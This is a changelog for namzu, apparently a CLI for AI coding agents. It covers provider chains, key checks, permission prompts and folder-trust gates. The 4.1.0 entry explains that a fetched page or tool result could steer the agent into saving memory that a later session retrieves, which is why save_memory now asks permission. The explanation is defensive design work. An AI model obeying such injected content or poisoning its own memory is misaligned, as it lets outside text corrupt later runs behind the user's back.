    It does not track anything; it moves when you upgrade namzu.

  If you parse `namzu doctor` output, the marker string changed.

## 6.0.0

### Major Changes

- 7be6884: **`/expand` reads a collapsed tool output in full. `Ctrl+O` is deprecated and
  stops expanding anything.**

  Tool diffs and command output collapse to six lines. The hint under them now
  names the command that reopens them — `… +6 lines · /expand 3` — and `/expand`
  with no argument takes the most recent one. The full text arrives as a new entry
  below, so the collapsed one stays where it was.

  ## What breaks

  **1. `Ctrl+O` no longer expands anything.** It is still bound: pressing it prints
  the reason and points at `/expand`, so nobody meets a dead key.

  Be clear about what it did, because it was not nothing. It was advertised as
  toggling full expansion for everything, and for output already on screen it was
  inert — finalized entries are printed once to the terminal's own scrollback and
  never redrawn, which is what keeps a long session bounded and native scrolling
  and selection working across the whole conversation. But pressing it _before_ a
  tool finished did have an effect: the result, when it arrived, printed in full.
  That behaviour is removed. It required deciding you wanted the output before you
  could see that it had been truncated, and nothing on screen ever mentioned it.

  _To keep the old behaviour:_ there is no flag for it. Run the tool, then
  `/expand`, which reaches output the key never could.

  **2. `expand` is now a reserved command name.** If you have a user-defined
  command at `~/.namzu/commands/expand.md` or `./.namzu/commands/expand.md`, the
  built-in takes the name and yours stops running — in the TUI and in `namzu run`
  / `run-stream` alike. Rename the file, and `/help` will report it as shadowed
  until you do.

  ## Also in this change

  - The collapse hint carries a number, and only bodies that actually truncate get
    one. A body short enough to print whole advertises nothing and takes no number.
  - The blank-row estimate that decides where the composer sits now counts the
    collapsed body under a tool call, the blank row between entries, and the width
    the body really renders at. It previously measured each entry by its first line
    alone, so a six-line tool result counted as nothing — in the direction that
    pushes the composer off the bottom of the screen.

## 5.0.2

### Patch Changes

- Updated dependencies [56c7d3a]
- Updated dependencies [ce51f5c]
  - @namzu/sdk@20.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 5.0.1

### Patch Changes

- e24e12a: Ctrl+V says what happened when there is no image to paste

  The status bar advertises `Ctrl+V to attach`. Pressing it read the clipboard,
  attached an image if it found one, and otherwise did nothing at all — no chip,
  no message, no error.

  So three quite different situations produced one identical silence: you have not
  copied an image; this machine has no clipboard tool installed; the key was never
  wired up. The operator's next move differs in each — copy an image, install a
  tool, or stop pressing the key — and the screen gave them nothing to choose
  with.

  Each outcome now says which it was, and a missing tool names what to install
  (`xclip` on X11, `wl-clipboard` on Wayland). The success path stays quiet,
  because the attachment chip is already the report.

  The reason had to be recovered before it could be shown: the clipboard reader
  returned a bare `null` for every failure, and on Linux a missing `xclip` and an
  empty clipboard are indistinguishable after the fact — both come back from the
  shell as a non-zero exit. It now checks whether any reader exists before
  attempting the read, and returns which of the two it found.

## 5.0.0

### Major Changes

- 190eeeb: The default model is current again, and says whose default it is

  **namzu's default Claude model changes from `claude-opus-4-7` to
  `claude-opus-5`** for the Anthropic provider, and from
  `anthropic/claude-opus-4-7` to `anthropic/claude-opus-5` for OpenRouter. Two
  generations had passed. Nothing errored — a run simply happened on an older
  model than the operator had any reason to expect, which is why it went unnoticed.

  **To keep the old model**, pick it in `/model`, or set it in
  `~/.namzu/preferences.json`:

  ```json
  {
    "version": 3,
    "providers": [{ "id": "anthropic", "model": "claude-opus-4-7" }]
  }
  ```

  A saved preference already wins over this constant, so anyone who has chosen a
  model is unaffected.

  **The picker now labels it `(namzu default)` rather than `(default)`.** It was
  described in the code as "the provider's own default", which it never was — this
  is a value namzu picks, it goes stale between provider releases, and an operator
  choosing from that list deserves to know it is a choice rather than an
  endorsement.

  Resolving the default at runtime was considered and rejected: it would buy a
  network call, a cache, and a staleness question on every launch, and the offline
  path is exactly where this defect would come back invisibly. The constant stays,
  with the obligation to re-check it at each provider release written where the
  constant is defined.

  The Bedrock default is **left unchanged and marked unverified.** That driver
  speaks the Converse API, whose ids are date-stamped
  (`<vendor>.<model>-<yyyymmdd>-v<n>:0`); the current value carries the version
  suffix but no date, so it fits neither that shape nor the newer bare alias.
  Nobody here has a credential to establish which the endpoint accepts, and a
  fabricated date would look authoritative while being a guess. That provider has
  no bundled driver in this build in any case, so the value is unreachable today.

### Patch Changes

- Updated dependencies [3c0df0c]
  - @namzu/sdk@19.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 4.5.0

### Minor Changes

- d3bd080: A wrong API key is no longer reported as working

  Typing a key into the picker ran a check that could not fail for two providers.
  Measured against deliberately invalid keys, both said the key was good.

  **With an OpenRouter key, any string at all passed.** A typo, the wrong
  clipboard entry, a revoked key — all were accepted and reported as verified. The
  check listed the model catalogue and treated a successful list as a passed
  check, and OpenRouter's catalogue endpoint does not authenticate, so it answered
  the same way whatever was sent. Nothing was wrong with that driver's listing; a
  catalogue was simply never evidence about a key.

  **With an Anthropic key, a real rejection was discarded.** The listing caught
  the `401` and returned a hardcoded three-model list, which the check read as
  success — so the truth existed, was thrown away, and was replaced by something
  that looked like an answer.

  A credential check is now a separate, declared capability. A driver that
  declares no probe is reported as **not checked**, never as verified, so a driver
  added in future cannot silently inherit a check it does not perform. Anthropic,
  OpenRouter, OpenAI and Ollama declare one; OpenRouter's asks about the key
  rather than the catalogue.

  Refusal and doubt stay distinct. A `401` means the key is genuinely refused; a
  timeout or a DNS failure means nothing was learned, and is reported that way —
  telling someone on a broken connection to rotate a working key is a different
  error, not a smaller one.

  **Anthropic's model listing also never once ran.** The SDK method was pulled out
  of its namespace and called bare, so it lost `this`, threw a `TypeError` on
  every call, and was swallowed by the same catch — the hardcoded models were not
  a fallback but the only answer the method could give. It now calls the live
  endpoint, and falls back only when that genuinely fails.

  The four driver packages are `minor` rather than `patch`: each gains a method
  it did not have, and added functionality is a minor whatever the size of the
  diff. Anthropic's earns it twice over, because its listing now returns the live
  catalogue where it previously returned the same three hardcoded entries to every
  caller - so the value every existing caller receives changes.

### Patch Changes

- Updated dependencies [d3bd080]
  - @namzu/sdk@18.1.0
  - @namzu/anthropic@3.2.0
  - @namzu/openrouter@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/ollama@2.1.0

## 4.4.1

### Patch Changes

- 452a82a: **Credential discovery now states what it asks, and still lists only what it can
  use.**

  The `discoverProviders` header said it asks "three questions in order" and then
  listed two. The omitted one was the Keychain read — the question that takes a
  secret off the machine, so the one a reader most needs to see. It now lists
  three, in execution order (environment variable, Keychain, local probe), and
  states plainly that **the Keychain path is macOS-only**: on Windows and Linux
  there are exactly two doors, and a credential kept only in the OS credential
  store is not found. That is a gap rather than a nuance, and it is now written
  where someone reading the file will meet it.

  **A local provider whose server is not running is still not listed**, and the
  dead branch that proposed listing it is removed. Membership in the discovery
  list means "usable right now", and that is a contract two readers depend on: the
  `providers.chain` doctor check reads presence itself as the verdict for a
  provider that needs no key, and the session's chain builder applies no
  credential test to a local one. An entry for a down server would report it
  `reachable` and build it into the chain, failing on the day it was supposed to
  rescue a run. The operator-facing intent behind that branch already exists in
  the picker's empty state, which names both local servers and their ports and
  says to start one.

  No behaviour changes: the removed branch had an empty body, guarded by a
  condition (`!opts.skipProbes === false`) that did not mean what the comment
  above it said. Closes #258.

## 4.4.0

> **This version was never published.** `4.3.1` is followed on the registry by
> `4.4.1`; there is no `4.4.0` to install, and this section is kept rather than
> deleted because the work below did ship — inside `4.4.1`.
>
> What happened: the release PR that produced these version numbers had been
> computed before the changeset for `4.4.1` landed on `main`, so merging it
> bumped versions against a state that was already stale. The release workflow
> declined to publish and opened a fresh version PR instead, which is the
> correct behaviour and is why nothing was lost — but the bump had already been
> written, so this number was spent without ever reaching npm.
>
> The precondition that prevents it is now in the release skill: before merging
> a version PR, every changeset present on `main` must appear in that PR's diff.

### Minor Changes

- 3eed8a0: **A provider namzu cannot build is no longer offered as if it could.** Three
  registry entries advertised providers whose driver packages are not
  dependencies of the CLI. Two of them are genuinely discovered — one by a local
  probe, one by an ambient `AWS_ACCESS_KEY_ID` — so the picker listed them,
  choosing one saved it, and the next session refused it on a screen with a
  disabled composer where the advice "pick another" cannot be followed.

  `ProviderRegistryEntry` gains **`constructible`**: whether this build of the
  CLI bundles a driver for the entry. It is a statement about the CLI's
  dependencies, not about the provider. Four consumers read the registry as truth
  and only `constructProvider` knew better; now they all read the same answer.

  What changes for an operator:

  - **The picker** still lists a discovered-but-unbuildable provider, marked
    `unavailable in this build`, and refuses to accept it with a message naming
    the providers that do work. Hiding the row was rejected: someone whose only
    local server is one of these would see "No providers detected", which is
    false.
  - **A saved primary** naming one is refused when preferences are read, which
    routes to the picker with the reason. This is the fix — refusing later, at
    construction, is what produced the dead end.
  - **`writePreferences`** refuses to save one as a primary.
  - **A fallback** naming one is unchanged: dropped from the chain at launch with
    a notice, session runs. Refusing the whole file over a spare would take away
    a working primary.

  No dependencies were added. Bundling the three drivers is a supply-chain
  decision with a real cost — one pulls a large cloud SDK into every install —
  and it belongs to the owner. This change makes the entries stop lying either
  way; wiring any of them later is a one-line flag flip plus a switch arm, held
  in agreement by a test. Closes #257.

## 4.3.1

### Patch Changes

- 5b6adcf: The status bar no longer truncates away the keys it is there to advertise

  The footer is one line that cuts off at the terminal edge, and the hint — the
  only place any key is named — sat at the end of it. So the hint is what got cut.
  At an ordinary 100-column terminal it disappeared entirely, and not only on a
  deep path: a realistic provider and model fill the line between the working
  directory and the hint, so even `/home/dev/api` lost it.

  That made a set of recent fixes invisible rather than wrong. The trust gate
  advertising `Esc`, the permission prompt naming every key that decides it, and
  the picker naming its exits all exist on screen in exactly one place, and on a
  normal terminal that place had already been cut off.

  The line is now budgeted before it is drawn. The hint and the run state are
  never dropped; everything else yields, in the order of what can be recovered
  some other way:

  1. **usage** and **the context gauge** — `/cost` prints both exactly.
  2. **the provider label** — the longest segment and the least distinctive, since
     the model name implies it.
  3. **the working directory**, shortened from the left so the leaf directory
     survives — `…/packages/core` still tells you where you are.
  4. **the model**, and only then the path entirely.

  Nothing changes on a wide terminal with a short path, which is where this looked
  fine all along.

## 4.3.0

### Minor Changes

- b0f166b: **`namzu doctor` now reports provider-chain capability disagreements.** It
  listed which members had credentials and could not say whether the chain it was
  describing could run at all — so a chain with every key in place reported
  `pass`, and the operator found out it was unusable by trying to start a session.

  Reading what a provider declares requires that provider's package to be
  registered, and the only registration path was module-private inside the
  interactive session. A diagnostic that cannot see what the thing it diagnoses
  sees is checking the wrong thing. `ensureRegistered` and
  `resolveChainCapabilities` now live beside the registry, in
  `integrations/providers/register.ts`, and the session and the doctor reach them
  without either importing the other.

  `providers.chain` gains three outcomes:

  - **fail** — the members disagree and the mismatch has not been accepted, so a
    session will be refused. Reported ahead of the credential result, because it
    stops every run.
  - **warn** — the mismatch has been accepted. Still named: the session prints it
    on every launch, and a diagnostic that went quiet would disagree with the
    thing it describes.
  - **warn / fail** — a member whose declaration could not be read, listed
    separately from the disagreements because an unanswered question is not a
    conflict. `fail` when it is the primary, which cannot start a session either.

  The cost is named rather than hidden: this check now dynamically imports the
  driver package of every member in the chain. That is the price of reading a
  declaration, on a command whose whole job is to look.

  No behaviour changes inside a session — the registration state is one set in one
  module, as it was, because two copies would double-register and throw.

  Closes #262.

- d52ce59: Leaving the provider picker takes you back where you were

  The picker has two entry points and had one exit between them.

  **`/model` then `Esc` no longer throws away your session.** Cancelling sent you
  to the phase namzu uses for "I tried and cannot serve" — a screen with a
  disabled composer, from which `/model` cannot be typed again. Declining to
  change model cost you the working session you already had. It now returns to the
  chat.

  **`Ctrl+C` works in the picker.** The key handler was switched off for the whole
  picker phase, so on the first screen a new user sees, the interrupt did nothing
  useful: one press armed an exit whose "press again" notice is printed into a
  transcript the picker does not render, and only a second press left. It exits on
  the first press now, and the hint names it.

  **`Esc` on first run exits.** There is no screen behind the picker then, so
  leaving the picker is leaving the program — which is what the empty picker's
  footer has always said `esc` does.

  The hint now says which of the two `Esc` means: `esc keep current` when a
  session is behind it, `esc or Ctrl+C exit` when nothing is.

### Patch Changes

- 6e287fa: A draft is no longer destroyed by a permission prompt, or by interrupting a turn

  The composer stays editable while the agent works, and the docs encourage typing
  a follow-up there. Two separate mechanisms then threw that text away without the
  operator doing anything to ask for it.

  **The permission overlay unmounted the composer.** It was rendered in a ternary
  _against_ the composer, so when the agent asked to run a tool the composer was
  removed from the tree and React discarded its state — the sentence in progress,
  any pasted-text chips, and any pasted images. Nothing was pressed; the prompt
  simply arrived. The overlay and the composer are now siblings, and the composer
  draws nothing while the prompt is up instead of ceasing to exist.

  **Esc cleared the draft while interrupting a turn.** Both handlers fire on one
  keypress: the app aborts the turn and the composer cleared itself. The status
  bar advertises Esc as the interrupt, so following the instruction on screen
  destroyed the draft. A running turn now owns Esc; with nothing running, Esc
  still clears the composer, which is what it is for.

  Nothing is required of you, and nothing looks different until the moment it
  used to lose your text.

- Updated dependencies [52b339e]
- Updated dependencies [5be5007]
  - @namzu/sdk@18.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 4.2.0

### Minor Changes

- 8348589: **A declared provider chain now falls over.** It was validated, doctor-checked and capability-refused, and nothing ever used it — `providers[1..N]` were decoration. They are not any more.

  **If you have one provider, nothing changes.** A one-member chain composes to exactly the previous behaviour, byte for byte, and emits no new events.

  **If you have declared fallbacks, they will now be used.** Your primary still gets its full retry budget first, and a `Retry-After` is still honoured before anything moves — but a rejected credential, a missing model, an exhausted rate limit or an outage now advances to the next member instead of failing the turn. The scope is the turn: your next message starts at the primary again.

  namzu will not fall over on a failure that is a property of your _request_ — a context overflow, a rejected request, a refusal — because the identical request fails identically on the next provider.

  **Every swap is announced.** A new `provider_fallback` run event, `provider.fallback` on the wire, and a transcript line in the CLI naming the member that failed, why, and the member now serving.

  **That announcement is why this is a major.** `RunEvent` and `StreamEventType` are wider, so a consumer that switches exhaustively over either — with no `default` and a `never` check — stops compiling until it adds an arm. That is not a hypothetical: the SDK's own A2A mapper, SSE mapper and run reporter all do it, and the compiler named all three in this change, exactly as it did in 12.0.0 when `plan_completed` and `plan_failed` were added and that release went out as a major for this reason. Widening a union a consumer reads is a break in this repo whatever the ecosystem convention is; the fix is one `case` per new member.

  **A fallover loses the prompt cache**, so the rest of the turn re-reads your whole context at full price. That is the largest single cost of running a chain and it is worth ordering the chain accordingly.

  **Breaking for one combination, and only that one:** `query()` now throws `invalid_config` when `pricing` is passed together with a chain of more than one member. One pricing table cannot price two members, so the reported total — and `runConfig.costLimitUsd`, which is enforced from it — would be wrong by an unbounded margin and silently so. To keep pricing, declare one member; to keep the chain, drop `pricing`. No existing caller can hit this, because the chain is only reachable through the new `fallbackProviders` option.

  New in `@namzu/sdk`: `withProviderFallback`, `ProviderChainMember`, `WithProviderFallbackOptions`, `QueryParams.fallbackProviders`, `StreamChunk.fallback`, `ProviderFallbackNotice`.

  A fallback with no credential is left out of the chain and named at launch, rather than discovered as a 401 on the day your primary goes down. Sub-agents resolve their provider independently and do not inherit the chain.

### Patch Changes

- Updated dependencies [8348589]
  - @namzu/sdk@17.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 4.1.0

### Minor Changes

- de3d19a: `save_memory` now asks before it writes

  The CLI decided which tools could skip the permission prompt from a
  hand-maintained list of names called `READ_ONLY_TOOLS`. Three tools on it —
  `save_memory`, `task_create` and `task_update` — declare `readOnly: false` in
  the SDK. A constant asserted the exact property it was getting wrong, which is
  how the disagreement survived: nothing reading it had reason to doubt the name.

  **`save_memory` comes off, and this is the user-visible change.** It writes
  content that outlives the run: what is saved now is retrievable by
  `search_memory` in a later session, out of `<cwd>/.namzu/memory` inside your own
  project. So a tool result or a fetched page that talks the model into saving
  something reaches a future run's reasoning. It is not injected into the prompt
  automatically — that is `MEMORY.md`, a different thing — but retrievable is
  enough. A write that survives the process is not read-only under any reading.

  If the agent saves memories often in your workflow, you will now see a prompt
  where you did not. Approve-all (`a`) covers the session, and a
  `{"permissions": {"save_memory": "allow"}}` rule in `namzu.config.json` covers
  it permanently.

  **`task_create` and `task_update` stay exempt, honestly labelled.** They are the
  model's own plan for the current request, written several times per planning
  turn, and prompting each would put a consent dialog between the agent and its
  todo list. They now live in a set named `PROMPT_EXEMPT_WRITES` — an override
  that says it is one — with the reason recorded per entry, and `/permissions`
  discloses them.

  **The read-only half is no longer a list of names.** It is each tool's own
  `isReadOnly()` declaration, resolved against the live registry at the moment of
  the call, so a tool server's tools and the deferred task tools are covered too.
  A name list in the consumer is a second source of truth: a new read-only tool
  missing from it merely gets prompted, but a _renamed_ tool silently changes
  posture with nothing to notice.

  Two comments claimed these tools "touch only the agent's own `~/.namzu` state".
  They write to `<cwd>/.namzu` — the working directory, not the home directory.
  Both are corrected.

  `/permissions` also now names the built-in safety gate, which hard-denies a
  narrow set of catastrophic shell patterns in every mode and which no flag can
  switch off. The page claimed to describe what decides a tool call "in the order
  it actually decides it" and began one step in; a true-but-incomplete order is
  still a wrong order.

## 4.0.1

### Patch Changes

- 93efce0: `/permissions` reports the approval posture actually in force

  The page whose whole job is to answer "how do tool calls get approved here" gave
  two answers that were not true.

  **It could not see "approve all".** Pressing `a` at a prompt sets a latch that
  approves every later tool batch for the rest of the session. That latch lived
  inside the agent session's closure and nothing exposed it, so `/permissions`
  reported the posture from your flags alone and kept printing _"Unreviewed calls:
  you are asked before they run"_ after you had turned exactly that off. One
  keystroke inverted a security posture and the surface that exists to report it
  could not know. It now reports approve-all as automatic approval, says how to
  get back to being asked, and reads the latch when it renders rather than
  inferring it.

  **It never mentioned that some tools are never prompted for.** `read`, `glob`,
  `grep`, `ls`, and the memory and task tools run without asking, always. That is
  deliberate and defensible, but it is undiscoverable by using namzu — the calls
  simply never appear, so their absence reads as "the agent did not use any". The
  readout now names the set, taken from the same list the gate consults so the two
  cannot drift, and states the two limits honestly: a rule can still deny one, and
  anything flagged destructive is prompted for even if it is on the list.

  Two smaller corrections on the same page:

  - **Rules are described instead of named.** `describeRule` handled two of the
    eight rule types and printed the bare type name for the rest. A `permissions`
    table compiles every per-pattern entry to `custom_pattern`, so the commonest
    real config — `"git push*" = "deny"` — was reported to its author as the
    single word `custom_pattern`. All eight are spelled out now, with a `never`
    guard so a ninth fails the build rather than printing itself. A compiled
    pattern is shown as the regex it compiled to, which is not what you typed;
    that is the form that actually decides, and inventing a prettier one would be
    reporting a rule that is not in force.
  - **It pointed at TOML syntax for a JSON file**, telling you to add a
    `[permissions]` table to `namzu.config.json`.

  No public API changes; `SlashContext` is internal to the CLI.

## 4.0.0

### Major Changes

- 167dbb6: Enter no longer grants folder trust

  **Press `y` to trust a folder.** `Enter` now grants nothing at the trust gate.
  If you accept by reflex with `Enter`, that reflex has to change.

  This is the same defect as "Enter no longer approves a tool-permission prompt"
  in the previous release, at the screen before it — and the pair is worth reading
  as a class rather than as two incidents. Both screens asked the operator to
  permit something, both accepted the key people press to dismiss whatever just
  appeared, and neither named that key anywhere on itself. The first one looked
  like a slip. The second says it was a habit, so the rule is now written down
  once, in `consent-timing.ts`, where the next screen of this kind will inherit it.

  The trust gate is the sharper of the two:

  - **The keystroke is near-certain, not merely possible.** You reach this screen
    by typing `namzu` and pressing Enter. A key repeat, a buffered second press,
    or an impatient double-tap arrives while the gate is still painting — the one
    moment in the program where an in-flight Enter should be expected.
  - **The decision is durable.** Approving a tool call runs one tool. Accepting
    here writes the folder into `~/.namzu/trust.json`, which covers every
    subfolder, so a stray keystroke grants standing permission to a whole tree.

  What changes:

  - **`y` grants trust; `Enter` does nothing.**
  - **`y` is ignored for 350ms after the gate appears**, so a keystroke aimed at
    the shell behind it cannot land on it.
  - **Refusal is never deferred.** `n`, `Esc` and `Ctrl+C` exit on the first
    press. Nothing has been written and nothing has run, so an accidental refusal
    costs a relaunch — the recoverable direction — and a hesitating escape hatch
    on the program's first screen would read as a hang.
  - **`Esc` is now advertised.** It always exited; it said so nowhere.

  `permission-timing.ts` is renamed `consent-timing.ts`, since it now governs both
  consent screens. It is internal to the CLI and not part of the published API.

## 3.0.0

### Major Changes

- cf7c14f: Enter no longer approves a tool-permission prompt

  **Press `y` to approve.** `Enter` now decides nothing at the permission
  overlay. If you approve by reflex with `Enter`, that reflex has to change — this
  is the whole of the break, and it is deliberate.

  The prompt appears on the agent's schedule, not yours. The composer stays
  editable while a turn runs, and the docs encourage typing a follow-up there, so
  the overlay can take the screen while your hands are mid-sentence in the
  composer behind it. `Enter` is the key most likely to be already in flight at
  that moment — it is how you send the message you were typing — and it was wired
  to the approving branch. The result was that the keystroke sending your
  follow-up could approve a tool call you had not read. Approving is the one
  decision at this prompt that cannot be undone, so it should not be reachable by
  the key people press to dismiss whatever just appeared.

  `Enter` was named as an approval in `docs/cli/tools.md` and nowhere else: not on
  the overlay, not in the status hint. The overlay now names every key that
  decides it — `y` approve, `n` / `esc` reject, `a` approve all — and names no key
  that does not.

  Two smaller changes come with it:

  - **An approving key is ignored for 350ms after the prompt opens.** `y` and `a`
    are ordinary letters, so someone mid-word when the overlay mounts was one
    keystroke from approving. Refusal is never deferred: `n`, `Esc` and `Ctrl+C`
    answer on the first press, because a refusal you did not mean costs a retry
    and an approval you did not mean costs whatever the tool did.
  - **`Esc` is now advertised on the overlay.** It always rejected; it said so
    nowhere.

### Minor Changes

- 1674ba2: Preferences hold an ordered chain of providers, not one

  `~/.namzu/preferences.json` now stores `providers`, an ordered list, in place of
  the single `provider` + `model` pair. Index 0 is the primary and is what runs.

  **Nothing is required of you.** A `version: 2` file is read as a one-member
  chain — one provider is a one-element list, which is unambiguous — and is
  rewritten in the new format the next time a choice is saved. A `version: 1` file
  is still refused, as before. Downgrading namzu after a chain has been written
  reports "please re-pick" rather than silently dropping the members it cannot
  represent.

  **Only the primary runs today.** Automatic failover is a separate change; this
  one is the configuration it will read. Declaring a longer chain is still worth
  doing now, because the whole of it is checked:

  - Every member must name a provider namzu knows, **including members after the
    first**. A fallback that names a provider that does not exist used to load
    fine and fail at construction — on the day the primary went down, which is the
    worst moment to discover it.
  - A member may not repeat an earlier one exactly. The same provider with a
    _different model_ is allowed, and is a real chain: a large model falling back
    to a smaller one.
  - The chain may not be empty.

  A rejected chain names the position that broke it (`primary provider`,
  `fallback #1`, …) and re-opens the picker.

  `namzu doctor` gained `providers.chain`, which prints the chain in your declared
  order with each member's credential state, so the order is legible without
  launching the TUI. A fallback with no credential is a warning; a primary with
  none is a failure.

  `namzu run --provider <id>` now **replaces** the chain for that run rather than
  re-heading it, so a run you scoped to one provider cannot be answered by a
  different one. `--model` on its own re-models the primary and leaves the rest of
  the chain in place. Neither changes what a single-provider setup does today.

  Adds the `providerChainCheck` export for embedded consumers assembling their own
  doctor registry.

  `namzu doctor` also indents every line of a multi-line check message. Previously
  only the first line took the report's indent and the rest broke out to column 0,
  so a multi-line answer read as though the report had ended.

- 173b93c: Refuse a provider chain whose members declare different capabilities

  namzu negotiates capabilities once per run, against the provider it was handed,
  and that answer decides whether tools go into the prompt and whether image and
  document attachments are mapped. A chain whose members disagree cannot be
  honoured by taking the strongest declaration — a run that fell over to a weaker
  member would arrive holding a request shaped for a provider no longer serving
  it.

  Nor by taking the weakest. That is the trap this refuses to walk into: an
  operator who adds a weaker fallback to gain resilience would find their
  **primary** had quietly lost tool support, on every run, to guard against a
  failure that happens rarely. A capability given up permanently for a rare
  benefit, with nothing saying so.

  So neither is chosen for you. A disagreeing chain is refused, naming which two
  members disagree and on what:

  ```
    - fallback #1 (<label>) declares it cannot call tools, while primary provider
      (<label>) declares it can call tools — if the chain falls over to it, tools
      become unavailable.
  ```

  Every disagreeing capability is listed, not just the first, so the configuration
  can be fixed in one pass rather than one round-trip at a time.

  **To accept the limitation**, set `"allowCapabilityMismatch": true` in
  `~/.namzu/preferences.json`. The chain then runs and the disagreement is printed
  on **every** launch — the TUI, `namzu run`, and a `notice` event on
  `namzu run-stream`. Not once: an acceptance given once and forgotten is how a
  silent degradation returns through the front door.

  Two limits, stated because a check that overstates its authority stops being
  believed:

  - It compares **declarations**, at the type level. That is what is knowable
    without constructing a provider, and constructing one needs a credential —
    which the fallback nobody has set up yet does not have. The runtime treats a
    constructed provider's own declaration as authoritative.
  - It says nothing about the current run. Only the primary runs today, so its
    capabilities are in force in full; every sentence is about what happens _if
    the chain falls over_. When failover lands, the run-level statement becomes
    true and can be made then.

  A member whose declaration cannot be read — a provider with no construction path
  yet — is reported as unresolved rather than assumed to agree, and does not by
  itself refuse the chain.

  Adds `AgentSession.configNotices`, the channel these are surfaced on.
  Single-provider setups are unaffected and gain no new output.

## 2.6.1

### Patch Changes

- Updated dependencies [61b5cc8]
  - @namzu/sdk@16.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 2.6.0

### Minor Changes

- 01856b7: You can type a credential into a running namzu instead of restarting.

  With no key discovered, the picker used to list three sources and say "then
  restart namzu" — accurate, and a cliff: the product told you to leave it in
  order to use it. It now also offers `k`, which takes a key and starts the
  session with it.

  **Held in memory for that session only, and written nowhere.** The screen says
  so before you type and again afterwards, and names the environment variable that
  makes it durable.

  That is a decision, not an omission. The obvious durable home is the OS
  keychain; namzu's keychain support is macOS-only and reads a _different_
  product's credential store, so a key written there would be filed under someone
  else's name — and on Windows there is no keychain path at all. The remaining
  option was a plaintext file. A secret at rest should be something you chose, not
  something that arrived because you typed into a text field.

  - **Masked while typing** — never the key, and never its length either, since
    length distinguishes vendors and tiers.
  - **Checked at the moment you type it**, by listing models, which costs nothing.
    A rejected key leaves you on the screen with what you typed intact.
  - **Never claims a check it did not do.** A provider with no cheap way to
    validate a key is reported as exactly that, with the first message named as
    the real test.
  - **Never reaches a transcript or an error.** Errors carry the provider's
    reason, truncated, and the function that writes the message is not given the
    key.

  A typed credential shows as `typed · this session only` wherever providers are
  listed.

- 857c129: `/model` now picks a model.

  It re-opened the **provider** list, and the model was always the provider's
  default. So someone who wanted a different model typed the obvious command,
  chose a provider, and nothing changed — the command was named for the thing it
  did not do.

  The chain was wired end to end except one link: `Picker`'s `onSubmit` accepted
  `{ provider, model? }`, the app wrote `model` into preferences, and a session
  read `prefs.model ?? entry.defaultModel`. The picker never produced a model.

  `/model` is now two steps — provider, then model. `esc` steps back to the
  provider list rather than out. The model step starts on the one already in
  force, so re-opening it does not quietly reset you to the default. Your choice
  is written to `~/.namzu/preferences.json` and is what the next turn is sent with.

  **When the list is unavailable, the picker says which unavailable it is.** Asking
  a provider for its models can end four ways — it answered with none, it did not
  answer inside 3 seconds, the driver has no listing capability, or it errored —
  and all four used to arrive as an empty array. Three of them are not "this
  provider has no models", and the timeout is the one you can do something about.
  Each now shows its own line, and the provider's default stays selectable in every
  case, so the step is never a dead end.

  Host UIs consuming `namzu providers-json` are unaffected: that command still
  renders any failure as an empty list, and is now the only caller that discards
  the reason.

## 2.5.0

### Minor Changes

- 68eb7ef: Your own slash commands now work in `namzu run` and `namzu run-stream`, not only
  in the terminal agent.

  Before this, `namzu run "/review src/parse.ts"` sent that string to the model as
  prose. The model tried to make sense of it and answered about something else, at
  exit 0 — the command had not failed, it had quietly done something different.
  Running one from a script is most of the reason to write one, so this was the
  larger half of the feature missing rather than a boundary.

  **A leading `/` still does not make something a command.** `namzu run
"/usr/local/bin is missing"` is an ordinary prompt and is sent as written. What
  makes it a command is the first word naming one your project declares: a file in
  `.namzu/commands/` is an explicit declaration, and a word that merely starts with
  a slash is not. Prompts that begin with a slash keep working.

  Built-in commands are interactive and do nothing headless. A prompt that is
  exactly one — `namzu run "/help"` — is refused with a message instead of being
  sent, because nobody means that literally. `namzu run "/clear the cache in
redis"` passes through untouched; the extra words are what distinguish a request
  from an invocation.

  A command that cannot run — arguments a template has no `$ARGUMENTS` to receive,
  or frontmatter that will not parse — exits non-zero with the reason and sends
  nothing. A script continuing on a misfired command is the outcome worth
  preventing.

## 2.4.0

### Minor Changes

- 997b8dd: A markdown file is now a slash command.

  ```
  ~/.namzu/commands/<name>.md      everywhere
  <cwd>/.namzu/commands/<name>.md  this project
  ```

  `review.md` becomes `/review`, and the body is the prompt it sends. A project
  command shadows a user one of the same name — the same precedence skills use.
  Frontmatter is optional; only `description` is read, and it is what `/help` and
  the autocomplete dropdown show.

  **Arguments go through `$ARGUMENTS`.** `/review src/parse.ts` substitutes the
  path wherever the token appears. A template with no `$ARGUMENTS`, invoked with
  arguments, is **refused** — it names your file and the token to add. Running it
  would discard what you typed, and a command that silently ignores half its input
  is worse than one that stops. A template with no token and no arguments is a
  static prompt and runs normally.

  Refusing is the reversible direction. Relaxing it later, by appending arguments
  somewhere, breaks nobody; tightening an append into a refusal would break
  everyone who had come to rely on it.

  **A file that will not load is refused, not skipped.** It stays in `/help`
  marked `⚠` with the parse error, and the rest keep working. A file named after a
  built-in is listed the same way rather than silently ignored — built-ins always
  win, and its author needs to know why theirs never ran.

  Files are read when the session starts; `/model` or a restart picks up a new
  one.

## 2.3.0

### Minor Changes

- d29174e: A `SKILL.md` written on Windows now works.

  The skill reader carried its own frontmatter regex, `/^---\n…\n---\n?/`, which
  is LF-only. A file saved with CRLF line endings — the Windows default — matched
  nothing, so the entire file was treated as body and the skill was listed under
  its directory name with `(no description)`. It never failed; it described the
  skill wrongly, which is why it survived this long.

  It now reads through `parseFrontmatter` from `@namzu/sdk`, so LF, CRLF and a
  lone CR all parse identically, a BOM is handled, and frontmatter keys can no
  longer reach `Object.prototype`.

  **One behaviour changed on purpose.** Frontmatter you _leave out_ is still fine
  and still documented: a file with no `---` fence is all body. Frontmatter you
  _open and get wrong_ is now refused instead of being treated as absent. The old
  answer put the unreadable YAML into the body, where it reached the model
